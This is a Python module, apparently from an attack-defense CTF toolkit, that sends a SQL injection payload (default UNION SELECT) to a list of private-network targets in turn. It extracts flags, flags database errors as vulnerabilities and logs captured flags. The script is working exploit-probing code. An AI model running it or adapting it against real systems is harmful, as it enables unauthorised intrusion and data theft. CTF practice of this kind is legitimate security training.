#!/usr/bin/env python3
"""Interactive, sequential, rate-limited targeted exploit probe for CTF Attack-Defense.

Safety features:
  - Private / CTF network IPs only (10.x, 172.16-31.x, 192.168.x, 127.0.0.1)
  - Sequential requests with mandatory delay (anti-DoS compliant)
  - Automatic flag regex extraction and response error detection
"""

import ipaddress
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import List, Optional, Tuple

from .colors import Colors, colorize, print_banner, safe_print
from .patterns import FLAG_REGEX

MIN_DELAY = 1.0
PRIVATE_ONLY = True
ERROR_RE = re.compile(r"(?i)(sql syntax|mysql|mariadb|postgresql|sqlite|syntax error|traceback|exception|undefined index|fatal error)")


def is_valid_private_ip(ip_str: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip_str)
        return addr.is_private or addr.is_loopback
    except ValueError:
        return False


def probe_single(
    target_ip: str,
    endpoint: str,
    param: str,
    payload: str,
    method: str = "GET",
    port: int = 80,
    timeout: float = 3.0,
) -> Tuple[bool, int, List[str], str]:
    """Send one probe request to target and extract flags or errors."""
    url_base = f"http://{target_ip}:{port}"
    if not endpoint.startswith("/"):
        endpoint = "/" + endpoint

    full_url = f"{url_base}{endpoint}"
    data = None

    if method.upper() == "GET":
        encoded_query = urllib.parse.urlencode({param: payload})
        separator = "&" if "?" in full_url else "?"
        full_url = f"{full_url}{separator}{encoded_query}"
    else:
        data = urllib.parse.urlencode({param: payload}).encode("utf-8")

    flags = []
    error_msg = ""
    status_code = 0

    try:
        headers = {"User-Agent": "ADCTF-Targeted-Probe/2.0"}
        if data:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(full_url, data=data, headers=headers, method=method.upper())
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            status_code = resp.status
            body = resp.read().decode("utf-8", errors="replace")
            flags = FLAG_REGEX.findall(body)
            err_m = ERROR_RE.search(body)
            if err_m:
                error_msg = err_m.group(0)
            return True, status_code, flags, error_msg
    except urllib.error.HTTPError as e:
        status_code = e.code
        body = e.read().decode("utf-8", errors="replace")
        flags = FLAG_REGEX.findall(body)
        err_m = ERROR_RE.search(body)
        if err_m:
            error_msg = err_m.group(0)
        return False, status_code, flags, error_msg
    except Exception as e:
        return False, 0, [], str(e)


def run_targeted_probe(
    targets: List[str],
    endpoint: str = "/",
    param: str = "id",
    payload: str = "1' UNION SELECT 1,2,3--",
    method: str = "GET",
    port: int = 80,
    delay: float = 1.5,
    timeout: float = 3.0,
    save_flags: str = "captured_flags.txt",
) -> int:
    """Execute sequential targeted probe across a list of target IPs."""
    print_banner("Targeted Exploit Probe", "Sequential Safe Exploit Verification")
    safe_print(f"[*] Endpoint : {colorize(endpoint, Colors.CYAN)} ({method.upper()})")
    safe_print(f"[*] Parameter: {colorize(param, Colors.YELLOW)}")
    safe_print(f"[*] Payload  : {colorize(payload[:60], Colors.BRIGHT_RED)}")
    safe_print(f"[*] Targets  : {len(targets)} hosts")
    safe_print(f"[*] Delay    : {max(delay, MIN_DELAY):.1f}s between requests (Anti-DoS)")
    safe_print(colorize("-" * 75, Colors.DIM))

    total_flags = 0

    for idx, tip in enumerate(targets, 1):
        if PRIVATE_ONLY and not is_valid_private_ip(tip):
            safe_print(f" [{idx}/{len(targets)}] {colorize(tip, Colors.DIM)} -> SKIP (Bukan IP Private)")
            continue

        ok, code, flags, err = probe_single(tip, endpoint, param, payload, method, port, timeout)

        if flags:
            total_flags += len(flags)
            safe_print(f" [{idx}/{len(targets)}] {colorize(tip, Colors.CYAN)} -> 🚩 {colorize(f'FLAG: {flags[0]}', Colors.BOLD + Colors.BRIGHT_GREEN)}")
            with open(save_flags, "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%H:%M:%S')}] {tip} -> {flags[0]}\n")
        elif err:
            safe_print(f" [{idx}/{len(targets)}] {colorize(tip, Colors.CYAN)} -> 💥 {colorize(f'VULN ERROR: {err}', Colors.BRIGHT_YELLOW)} (HTTP {code})")
        elif ok:
            safe_print(f" [{idx}/{len(targets)}] {colorize(tip, Colors.CYAN)} -> [HTTP {code}] (No flag)")
        else:
            safe_print(f" [{idx}/{len(targets)}] {colorize(tip, Colors.DIM)} -> [FAILED / {err or code}]")

        time.sleep(max(delay, MIN_DELAY))

    safe_print(colorize("\n" + "=" * 75, Colors.DIM))
    safe_print(colorize(f"[*] Probe selesai. Total flag didapat: {total_flags}", Colors.BOLD + Colors.BRIGHT_WHITE))
    return 0
